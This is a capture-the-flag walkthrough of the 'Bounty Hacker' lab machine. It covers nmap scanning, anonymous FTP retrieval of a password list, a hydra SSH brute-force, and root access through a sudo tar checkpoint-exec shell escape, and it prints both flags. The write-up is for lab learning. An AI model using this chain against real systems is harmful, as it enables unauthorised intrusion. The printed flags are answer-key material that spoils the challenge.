```
Find open ports on the machine.

First of all we’ll need to find open ports on our target machine, but if you are beginner you’ll literally think what’s a port or port number, for them here is a little explanation about port number.

    Port: Ports are nothing but unique numbers which is assigned to many services running on your system to identify them on network. For example your firefox browser running on port something 5543.

    To check which ports running on your windows system , just run cmd as administrator and run below command:

    netstat -b

Now come to the question, find open ports, so for this we will use a nmap tool which is used for port scanning , helps us to find open ports n all, so let’s see what are the open ports on our target.

nmap -sV -sT -sU -A target_ip

    sV: This flag/option is used for version detection .
    -sT: TCP port scan
    -sU: UDP port scan
    -A: OS detection

But here -sV is enough to find open ports and services required to escalate, so let’s do it:

nmap -sV -sC target_ip

└─$ nmap -sV -sC 10.10.131.76
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-07 22:26 EDT
Nmap scan report for 10.10.131.76
Host is up (0.19s latency).
Not shown: 969 filtered tcp ports (no-response), 28 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.1.77
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.99 seconds



Here you can see 21,22,80 ports are open so why not to connect using ftp with target machine because anonymous login is allowed it means anyone can connect with the server using ftp, so let’s do it.

    Note: FTP is a file transfer protocol which runs on port 21 and used for the transfer of computer files between a client and server in a network via port 21.
    
    

Who wrote the task list? 
┌──(kali㉿kali)-[~/Downloads/bountyhacker]
└─$ ftp 10.10.131.76
Connected to 10.10.131.76.
220 (vsFTPd 3.0.3)
Name (10.10.131.76:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||25577|)
ftp: Can't connect to `10.10.131.76:25577': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |*****************************************|   418        3.86 KiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (1.39 KiB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |*****************************************|    68        0.97 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.25 KiB/s)
ftp> exit
221 Goodbye.


                                                                                      
┌──(kali㉿kali)-[~/Downloads/bountyhacker]
└─$ cat locks.txt   
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
                                                                                      
┌──(kali㉿kali)-[~/Downloads/bountyhacker]
└─$ cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin

lin


What service can you bruteforce with the text file found?

ssh


What is the users password? 

For this we’ll bruteforce user’s pasword with the help of lock.txt wordlist and hydra tool.

┌──(kali㉿kali)-[~/Downloads/bountyhacker]
└─$ hydra -l lin -P /home/kali/Downloads/bountyhacker/locks.txt 10.10.131.76 ssh 
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-07 22:44:29
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.131.76:22/
[22][ssh] host: 10.10.131.76   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-07 22:44:34



user.txt

┌──(kali㉿kali)-[~/Downloads/bountyhacker]
└─$ ssh lin@10.10.131.76      
The authenticity of host '10.10.131.76 (10.10.131.76)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.131.76' (ED25519) to the list of known hosts.
lin@10.10.131.76's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt 
THM{CR1M3_SyNd1C4T3}


root.txt (GTFOBins tar command sudo priv esc)

lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
# find -name flag.txt 2>/dev/null
# bash
root@bountyhacker:~/Desktop# ls
user.txt
root@bountyhacker:~/Desktop# cd /root
root@bountyhacker:/root# ls
root.txt
root@bountyhacker:/root# cat root.txt 
THM{80UN7Y_h4cK3r}

```

[[BlockChain]]